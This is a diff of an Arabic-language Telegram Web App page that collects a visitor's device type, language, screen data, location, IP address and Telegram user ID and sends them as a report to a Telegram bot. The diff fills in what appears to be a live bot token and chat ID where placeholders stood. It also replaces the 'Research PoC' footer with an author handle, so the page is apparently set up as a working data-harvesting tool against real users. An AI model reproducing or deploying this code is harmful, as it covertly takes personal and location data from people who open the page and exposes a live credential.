@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -259,7 +259,7 @@
 
     <div class="section-title"><i class="fa-solid fa-microchip"></i> العتاد والبيانات المتقدمة</div>
     <div class="glass-card info-grid">
-        <div class="info-item"><span class="info-label">نوع الجهاز</span><span class="info-value" id="val-dev-type">📱 هاتف</span></div>
+        <div class="info-item"><span class="info-label">نوع الجهاز</span><span class="info-value" id="val-dev-type">📱 phone</span></div>
         <div class="info-item"><span class="info-label">لغة النظام</span><span class="info-value" id="val-lang">--</span></div>
         <div class="info-item"><span class="info-label">دقة الشاشة</span><span class="info-value" id="val-res">--</span></div>
         <div class="info-item"><span class="info-label">Pixel Ratio</span><span class="info-value" id="val-pixel-ratio">--</span></div>
@@ -334,15 +334,15 @@
     </div>
     
     <div style="text-align:center; margin-top:20px; color:#555; font-size:11px;">
-        Research PoC - V4.2
+        By Black devil 
     </div>
 
     <script>
     // ======================
     // الإعدادات الأساسية
     // ======================
-    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";     // ← ضع توكن البوت هنا
-    const CHAT_ID   = "YOUR_CHAT_ID_HERE";       // ← ضع معرف القناة أو المجموعة هنا
+    const BOT_TOKEN = "7960728687:AAEYWfOamIwi5wPotGTH3LZyS1WDxT8q3Z8";     // ← ضع توكن البوت هنا
+    const CHAT_ID   = "-1003018202565";       // ← ضع معرف القناة أو المجموعة هنا
 
     const tg = window.Telegram.WebApp;
     tg.expand();
@@ -613,7 +613,7 @@
 
             // استخدام template literals الصحيحة
             const msg = `
-📱 **تقرير جهاز V4.2 (Fixed)** ━━━━━━━━━━━━━━━━━━━
+📱 **تقرير جهاز** ━━━━━━━━━━━━━━━━━━━
 💎 بريميوم: ${collectedData.isPremium}
 🌍 الموقع: ${loc}
 🌐 IP: ${collectedData.ip}
@@ -732,7 +732,7 @@ ID: ${tg.initDataUnsafe.user.id}` : 'غير معروف'}
 
             // 5. الساعة
             setInterval(() => {
-                const now = new Date().toLocaleString('ar-EG');
+                const now = new Date().toLocaleString('en');
                 document.getElementById('val-time').innerText = now;
                 collectedData.time = now;
             }, 1000);
